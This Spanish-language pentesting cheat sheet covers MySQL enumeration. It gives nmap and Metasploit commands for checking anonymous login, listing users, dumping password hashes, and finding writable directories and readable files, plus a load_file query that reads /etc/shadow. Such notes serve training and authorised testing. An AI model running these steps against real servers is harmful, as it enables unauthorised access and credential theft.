# MySQL

{% hint style="success" %}
Para hacer login en una base de datos con MySQL, ejecutamos el siguiente comando:

```bash
mysql -h 192.168.1.12 -u usuario -ppassword
```

ATENCION!! En el último parámetro, pondremos `-p` seguido de la contraseña sin espacios

Podemos omitir la contraseña para probar usuarios
{% endhint %}

## Enumeración Interna

### Bases de Datos

Una vez hayamos entrado en la BBDD con el usuario y contraseña, deberemos enumerar las bases de datos que sean inusuales o alguna que pueda tener información relevante. Para ello usamos el comando:

```sql
show databases;
```

Cuando queramos usar una BBDD, ejecutamos:

```sql
use example;
```

### Tablas

```sql
show tables;
```

### Ver toda la información de una tabla

```sql
SELECT * FROM tabla_ejemplo;
```

## Login Anónimo

Podemos comprobar si el login anónimo está hebilitado para algún usuario con NMAP y el siguiente comando:

```bash
nmap --script=mysql-empty-password -p 3306 192.168.1.1
```

<figure><img src="../../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>

## Enumeración de usuarios

Para ver otros posibles usuarios, es necesario contar con el acceso de algun usuario o su login anonimo. Después, con un script de nmap, se nos mostrarán otros usuarios:

```bash
nmap --script=mysql-users --script-args="mysqluser='root',mysqlpass=''" -p 3306 192.168.1.1
```

<figure><img src="../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

## Enumeración hashes de contraseñas

### Metasploit

Podemos enumerar hashes de los usuarios y sus contraseñas (también hasheadas). Para ello empleamos metasploit:

```perl
msfconsole

use auxiliary/scanner/mysql/mysql_hashdump

set RHOSTS 192.71.145.3

set USERNAME root

set PASSWORD ""

exploit
```

<figure><img src="../../.gitbook/assets/image (88).png" alt=""><figcaption></figcaption></figure>

### Nmap

Para enumerar los hashes de los usuarios con nmap, usaremos el siguiente comando:

```bash
nmap --script mysql-dump-hashes --script-args="username='root',password=''" -p 3306 192.168.1.1
```

<figure><img src="../../.gitbook/assets/image (93).png" alt=""><figcaption></figcaption></figure>

## Enumeración de directorios con escritura

Una vez tengamos credenciales validas o un login anónimo habilitado, podemos emplear el siguiente modulo de metasploit para saber en que directorios podemos escribir:

```perl
msfconsole

use auxiliary/scanner/mysql/mysql_writable_dirs

set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt

set RHOSTS 192.71.145.3

set VERBOSE false

set PASSWORD ""

exploit

```

<figure><img src="../../.gitbook/assets/image (89).png" alt=""><figcaption></figcaption></figure>

## Enumeración de ficheros con lectura

Podemos enumerar ficheros disponibles (que podemos ver su contenido) con el siguiente módulo de metasploit:

```perl
msfconsole

use auxiliary/scanner/mysql/mysql_file_enum

set RHOSTS 192.71.145.3

set FILE_LIST /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt

set PASSWORD ""

exploit
```

<figure><img src="../../.gitbook/assets/image (90).png" alt=""><figcaption></figcaption></figure>

## Leer archivos locales

Podemos leer archivos locales (previamente deberemos comprobar que ficheros podemos leer con la [#enumeracion-de-ficheros-con-lectura](mysql.md#enumeracion-de-ficheros-con-lectura "mention")). Para ello, ejecutamos la siguiente consulta en SQL:

```sql
select load_file("/etc/shadow");
```

<figure><img src="../../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>

## Enumeración de privilegios de archivo

{% hint style="info" %}
En MySQL, los privilegios de archivo permiten a los usuarios leer y escribir archivos en el sistema de archivos del servidor. Estos privilegios son potencialmente peligrosos, ya que pueden permitir a un usuario acceder a archivos sensibles o modificar la configuración del servidor.
{% endhint %}

Con el siguiente comando de NMAP podemos comprobar si tenemos privilegios de archivos puesto que pueden ser una via potencial de explotación. Para ello, ejecutamos el siguiente comando:

```bash
nmap --script=mysql-audit --script-args "mysql-audit.username='root',mysql-audit.password='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'" -p 3306 192.68.1.1
```

<figure><img src="../../.gitbook/assets/image (94).png" alt=""><figcaption></figcaption></figure>
